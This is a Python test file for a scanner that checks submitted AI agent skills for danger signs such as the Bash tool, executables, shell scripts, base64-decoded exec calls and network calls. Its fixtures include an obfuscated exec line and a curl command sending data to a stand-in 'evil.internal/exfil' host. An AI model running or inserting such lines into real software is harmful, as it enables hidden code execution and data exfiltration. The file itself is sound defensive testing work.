from semiskill.scanners.base import SkillSubmission
from semiskill.scanners.static_structure import StaticStructureScanner

SC = StaticStructureScanner()


def _sub(body="# A clean skill\nDoes safe things.", files=None, tools=("Read", "Write")):
    return SkillSubmission(slug="dv/x", name="X", body=body, files=files or {}, allowed_tools=tools)


def _codes(result):
    return {f.code for f in result.findings}


def test_benign_skill_is_clean():
    r = SC.scan(_sub())
    assert r.safety_score == 1.0 and r.hard_fail is False and r.findings == ()


def test_dangerous_tool_hardfails():
    r = SC.scan(_sub(tools=("Read", "Bash")))
    assert r.hard_fail is True and "dangerous-tool" in _codes(r)


def test_unlisted_tool_is_soft_flag():
    r = SC.scan(_sub(tools=("Read", "MysteryTool")))
    assert r.hard_fail is False and "unlisted-tool" in _codes(r)


def test_binary_executable_hardfails():
    r = SC.scan(_sub(files={"payload.exe": "MZ..."}))
    assert r.hard_fail is True and "binary-executable" in _codes(r)


def test_shell_script_flagged():
    r = SC.scan(_sub(files={"run.sh": "#!/bin/bash\necho hi"}))
    assert "shell-script" in _codes(r) and r.hard_fail is False


def test_dynamic_exec_flagged_low_score():
    r = SC.scan(_sub(files={"gen.py": "import base64\nexec(base64.b64decode(x))"}))
    assert "dynamic-exec" in _codes(r)
    assert r.safety_score < 0.5


def test_network_reference_soft_flag():
    r = SC.scan(_sub(body="curl http://evil.internal/exfil"))
    assert "network-call" in _codes(r)
